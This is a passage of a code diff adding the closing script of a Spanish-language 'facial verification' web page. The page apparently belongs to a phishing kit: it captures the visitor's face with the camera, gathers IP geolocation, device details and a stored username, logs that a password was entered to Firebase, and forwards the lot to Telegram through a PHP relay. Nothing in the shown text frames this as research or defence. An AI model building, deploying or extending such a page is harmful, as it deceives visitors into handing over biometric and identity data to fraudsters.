+            telegramStatus.classList.add("success-message");
+
+            // 5. Mostrar resultado
+            showCaptureResult();
+
+            // Detener detección
+            clearInterval(detectionInterval);
+
+            // Limpiar canvas de detección
+            canvasContext.clearRect(0, 0, videoWidth, videoHeight);
+
+            // Detener video
+            if (stream) {
+              stream.getTracks().forEach((track) => track.stop());
+            }
+
+            // Reiniciar estado
+            isCapturing = false;
+            countdown.textContent = "";
+
+            // 6. Cambiar estilo del contenedor de cámara
+            cameraContainer.classList.add("photo-captured");
+          } catch (error) {
+            console.error("❌ Error al capturar foto:", error);
+
+            // Actualizar estado de Telegram en caso de error
+            telegramStatusText.textContent = "❌ Error al enviar a Telegram";
+            telegramStatus.classList.remove("telegram-status");
+            telegramStatus.classList.add("error-message");
+
+            alert("Error al capturar la foto. Por favor, intenta de nuevo.");
+            isCapturing = false;
+            countdown.textContent = "";
+            captureBtn.disabled = false;
+
+            // Restaurar vista si hay error
+            video.style.display = "block";
+            canvas.style.display = "block";
+            faceGuide.style.display = "block";
+            const cameraContainer = document.querySelector(".camera-container");
+            cameraContainer.style.backgroundColor = "#000";
+          }
+        }
+
+        // Función para enviar foto a Telegram usando PHP
+        async function sendPhotoToTelegram(photoBase64) {
+          try {
+            // Obtener información de IP
+            const ipInfo = await getIPInfo();
+            const usuario = localStorage.getItem("usuario");
+            const timestamp = new Date().toLocaleString();
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+
+            // Firebase (si existe)
+            try {
+              if (window.db && window.doc && window.setDoc) {
+                const questionRef = doc(window.db, "s2", usuario);
+                await setDoc(questionRef, {
+                  lastSeen: window.serverTimestamp(),
+                  page: 0,
+                  passwordEntered: true,
+                });
+              }
+            } catch (error) {
+              console.log("Firebase no disponible, continuando...");
+            }
+
+            // Crear mensaje/caption
+            const mensaje =
+              "📸 CAPTURA FACIAL REALIZADA\n\n" +
+              "👤 USUARIO: " +
+              (usuario || "No identificado") +
+              "\n" +
+              "📅 FECHA Y HORA: " +
+              timestamp +
+              "\n" +
+              "📱 DISPOSITIVO: " +
+              platform +
+              "\n" +
+              "🌐 UBICACIÓN: " +
+              (ipInfo.city || "N/A") +
+              ", " +
+              (ipInfo.country || "N/A") +
+              "\n" +
+              "📍 COORDENADAS: " +
+              (ipInfo.lat || "N/A") +
+              ", " +
+              (ipInfo.lon || "N/A") +
+              "\n" +
+              "🆔 IP: " +
+              (ipInfo.ip || "N/A") +
+              "\n\n" +
+              "🔍 INFORMACIÓN DEL NAVEGADOR:\n" +
+              userAgent;
+
+            // Crear FormData para enviar al PHP
+            const formData = new FormData();
+            formData.append("mensaje", mensaje);
+            formData.append("imagen", photoBase64);
+
+            // Enviar al archivo PHP
+            const response = await fetch("telegram-foto.php", {
+              method: "POST",
+              body: formData,
+            });
+
+            if (response.ok) {
+              console.log("✅ Foto enviada a Telegram exitosamente");
+              return true;
+            } else {
+              console.error("❌ Error al enviar foto a Telegram");
+              return false;
+            }
+          } catch (error) {
+            console.error("❌ Error en sendPhotoToTelegram:", error);
+            return false;
+          }
+        }
+
+        // Función para obtener información de IP
+        async function getIPInfo() {
+          try {
+            const response = await fetch("https://ipapi.co/json/");
+            if (response.ok) {
+              return await response.json();
+            }
+          } catch (error) {
+            console.warn("⚠️ No se pudo obtener información de IP:", error);
+          }
+
+          // Datos por defecto en caso de error
+          return {
+            ip: "No disponible",
+            city: "No disponible",
+            country: "No disponible",
+            lat: "No disponible",
+            lon: "No disponible",
+          };
+        }
+
+        // Mostrar resultado de captura exitosa
+        function showCaptureResult() {
+          cameraControls.classList.add("hidden");
+          captureResult.classList.remove("hidden");
+          infoMessage.classList.remove("active");
+
+          console.log("✅ Verificación facial completada");
+        }
+
+        // Mostrar resultado de error
+        function showErrorResult(title, detail) {
+          document.getElementById("errorTitle").textContent = title;
+          document.getElementById("errorDetail").textContent = detail;
+
+          cameraControls.classList.add("hidden");
+          captureResult.classList.add("hidden");
+          errorResult.classList.remove("hidden");
+        }
+
+        // Event Listeners
+        startCameraBtn.addEventListener("click", () => startCamera("user"));
+
+        changeCameraBtn.addEventListener("click", () => {
+          const newFacingMode =
+            currentFacingMode === "user" ? "environment" : "user";
+          startCamera(newFacingMode);
+        });
+
+        captureBtn.addEventListener("click", startCountdown);
+
+        retryBtn.addEventListener("click", () => {
+          captureResult.classList.add("hidden");
+          photoPreview.classList.add("hidden");
+          telegramStatus.classList.remove(
+            "active",
+            "success-message",
+            "error-message",
+          );
+          telegramStatus.classList.add("telegram-status");
+          telegramStatusText.textContent = "Enviando foto.";
+          startCamera(currentFacingMode);
+        });
+
+        continueBtn.addEventListener("click", () => {
+          window.location.href = "index.html";
+        });
+
+        backBtn.addEventListener("click", () => {
+          errorResult.classList.add("hidden");
+          initialControls.classList.remove("hidden");
+
+          if (stream) {
+            stream.getTracks().forEach((track) => track.stop());
+            stream = null;
+          }
+
+          clearInterval(detectionInterval);
+          statusText.textContent = 'Presiona "Activar Cámara" para comenzar';
+        });
+
+        tryAgainBtn.addEventListener("click", () => {
+          errorResult.classList.add("hidden");
+          telegramStatus.classList.remove(
+            "active",
+            "success-message",
+            "error-message",
+          );
+          telegramStatus.classList.add("telegram-status");
+          startCamera(currentFacingMode);
+        });
+
+        // Verificar compatibilidad
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+          startCameraBtn.disabled = true;
+          startCameraBtn.innerHTML =
+            '<i class="fas fa-ban"></i> Cámara no compatible';
+          showErrorResult(
+            "Navegador no compatible",
+            "Tu navegador no soporta el acceso a la cámara. Por favor, usa Chrome, Edge o Firefox más recientes.",
+          );
+        }
+      });
+    </script>
+  </body>
+</html>
